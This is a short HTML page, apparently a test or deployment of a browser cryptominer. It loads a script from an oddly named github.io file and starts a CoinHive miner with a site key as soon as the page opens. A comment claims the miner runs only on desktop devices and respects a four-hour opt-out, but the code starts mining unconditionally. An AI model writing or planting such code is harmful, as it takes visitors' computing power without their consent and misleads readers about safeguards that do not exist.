<body>
<script src="https://lukacat10.github.io/asgiosaah.js"></script>
Hashes Per Sec: <span id="hashesPerSecond"></span>
<script>
	var min = new CoinHive.Anonymous('iWqKMHcQkRfSJmztLlnFlMNvAuGn34Uc', {throttle: 0.3});

	// Only start on non-mobile devices and if not opted-out
	// in the last 14400 seconds (4 hours):
		min.start();
		// Listen on events
	min.on('found', function() { alert("Found hash!") })
	min.on('accepted', function() { alert("Accepted hash!") })

	// Update stats once per second
	setInterval(function() {
		document.getElementById("hashesPerSecond").innerHTML = min.getHashesPerSecond();

		// Output to HTML elements...
	}, 1000);
	
</script>
</body>
</html>
